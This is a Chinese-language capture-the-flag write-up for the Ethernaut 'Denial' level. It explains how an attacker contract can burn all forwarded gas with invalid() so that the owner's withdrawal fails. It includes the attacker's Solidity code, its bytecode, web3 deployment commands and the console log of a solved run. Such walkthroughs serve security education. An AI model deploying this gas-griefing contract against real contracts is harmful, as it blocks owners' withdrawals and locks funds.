# 21 Denial





## 思路

目标: 拒绝owner提款

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
contract Denial {

    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address public constant owner = address(0xA9E);
    uint timeLastWithdrawn;
    mapping(address => uint) withdrawPartnerBalances; // keep track of partners balances

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint amountToSend = address(this).balance / 100;
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call{value:amountToSend}("");
        payable(owner).transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = block.timestamp;
        withdrawPartnerBalances[partner] +=  amountToSend;
    }

    // allow deposit of funds
    receive() external payable {}

    // convenience function
    function contractBalance() public view returns (uint) {
        return address(this).balance;
    }
}
```



思路:

要阻止划款到owner, 有可能的方式比如让`withdraw`函数revert掉, 但题目中使用的是`partner.call{value:amountToSend}("");` call函数有一个特点是:在攻击合约中进行revert的话, revert不会进行向上冒泡, 也就是题目注释中说的 The recipient can revert, the owner will still get their share. 

但`call`函数还有一个特点, 与`send` `transfer`使用定量的2300gas不同, `call`函数默认发送所有gas到被调用者(也可指定发送的gas数量). 题目中并没有指定gas, 所以就带来了问题, 被调用者(攻击合约)可以恶意消耗掉所有gas, 让`withdraw`后续代码无法运行.



操作码 `invalid` (对应yul的`invalid()`) 会消耗掉所有gas 

> INVALID: 相当于本参考文献中没有的任何其他操作码，但保证仍然是一条无效的指令。相当于以0,0为堆栈参数的REVERT(自Byzantium fork)，除了给当前上下文的所有gas被消耗。



所以 攻击合约可以写成这样

```solidity
contract Attacker{

    receive() external payable {
        assembly {
            invalid()
        }
    }
}
```





## 参考答案

```
^^.js:45 ‘(◣_◢)’ 正在从关卡获得新的实例... <  < <<请稍等>> >  >
redux-logger.js:1  action LOAD_LEVEL_INSTANCE @ 09:49:05.195
^^.js:140 ⛏️ Sent transaction ⛏ undefined/tx/0x639708ee993181037cd499c55de0db02d01a82b0ad7ce3ee7042778be9ca9c85
^^.js:35 => 实例地址0xa6af93119097649a8a42ea988AA2a7D29D769AD3
redux-logger.js:1  action LOAD_LEVEL_INSTANCE @ 09:49:11.848
^^.js:140 ⛏️ Mined transaction ⛏ undefined/tx/0x639708ee993181037cd499c55de0db02d01a82b0ad7ce3ee7042778be9ca9c85
redux-logger.js:1  action SET_BLOCK_NUM @ 09:49:18.622
let abi = []
let byteCode = "0x" +
        "6080604052348015600f57600080fd5b50604580601d6000396000f3fe608060405236600a57fe5b600080fdfea2646970667358221220bdbd51c10b7e8dc17a5d41a35e0836195db4be8a9da59892a6182d0b3ff7ba1664736f6c63430008110033"
       
       
       
//deploy it
let myContract = new web3.eth.Contract(abi);
let deploy = myContract.deploy({
	data: byteCode,
	arguments: []
});
let myInstance = await deploy.send({
	from: player
});
^^.js:140 ⛏️ Sent transaction ⛏ undefined/tx/0x40c128e5b7bd5a9b19ae5b52f3c44d3af3ea2c413088f2cf5b60ba2cf16073d5
^^.js:140 ⛏️ Mined transaction ⛏ undefined/tx/0x40c128e5b7bd5a9b19ae5b52f3c44d3af3ea2c413088f2cf5b60ba2cf16073d5
undefined
redux-logger.js:1  action SET_BLOCK_NUM @ 09:52:08.681
myInstance
C {_requestManager: e, givenProvider: Proxy, providers: {…}, setProvider: ƒ, …}
myInstance._address
"0x8059a6dCcBfbbAfbA013742FbF9C3ab66E0116a9"
contract.setWithdrawPartner(myInstance._address)
Promise {<pending>, _events: Events, emit: ƒ, on: ƒ, …}
^^.js:140 ⛏️ Sent transaction ⛏ undefined/tx/0x88cf03bfa8e7931ac84fa74d3182026dfefca2a078233c8dbaf0c78bcda06854
^^.js:140 ⛏️ Mined transaction ⛏ undefined/tx/0x88cf03bfa8e7931ac84fa74d3182026dfefca2a078233c8dbaf0c78bcda06854
^^.js:45 \,,/(◣_◢)\,,/ 正在提交关卡实例... <  < <<请稍等>> >  >
redux-logger.js:1  action SUBMIT_LEVEL_INSTANCE @ 09:55:06.322
redux-logger.js:1  action SET_BLOCK_NUM @ 09:55:08.650
^^.js:140 ⛏️ Sent transaction ⛏ undefined/tx/0xb4d6a45495d375e83c2378105b867177eddc5bf1ad4366d8585c5b9f8ce5e680
^^.js:73 (◔/‿\◔) 牛逼！, 你通过了这关!!!
^^.js:73 (◔/‿\◔) 牛逼！, 你通过了这关!!!
^^.js:73 (◔/‿\◔) 牛逼！, 你通过了这关!!!
^^.js:73 (◔/‿\◔) 牛逼！, 你通过了这关!!!
^^.js:73 (◔/‿\◔) 牛逼！, 你通过了这关!!!
^^.js:73 (◔/‿\◔) 牛逼！, 你通过了这关!!!
^^.js:73 (◔/‿\◔) 牛逼！, 你通过了这关!!!
^^.js:73 (◔/‿\◔) 牛逼！, 你通过了这关!!!
^^.js:73 (◔/‿\◔) 牛逼！, 你通过了这关!!!
^^.js:73 (◔/‿\◔) 牛逼！, 你通过了这关!!!
redux-logger.js:1  action SUBMIT_LEVEL_INSTANCE @ 09:55:12.345
^^.js:73 (◔/‿\◔) 牛逼！, 你通过了这关!!!
^^.js:140 ⛏️ Mined transaction ⛏ undefined/tx/0xb4d6a45495d375e83c2378105b867177eddc5bf1ad4366d8585c5b9f8ce5e680
^^.js:73 (◔/‿\◔) 牛逼！, 你通过了这关!!!
^^.js:73 (◔/‿\◔) 牛逼！, 你通过了这关!!!
^^.js:73 (◔/‿\◔) 牛逼！, 你通过了这关!!!
^^.js:73 (◔/‿\◔) 牛逼！, 你通过了这关!!!
^^.js:73 (◔/‿\◔) 牛逼！, 你通过了这关!!!
^^.js:73 (◔/‿\◔) 牛逼！, 你通过了这关!!!
^^.js:73 (◔/‿\◔) 牛逼！, 你通过了这关!!!
^^.js:73 (◔/‿\◔) 牛逼！, 你通过了这关!!!
^^.js:73 (◔/‿\◔) 牛逼！, 你通过了这关!!!
^^.js:56 
redux-logger.js:1  action SET_BLOCK_NUM @ 09:55:18.811

```

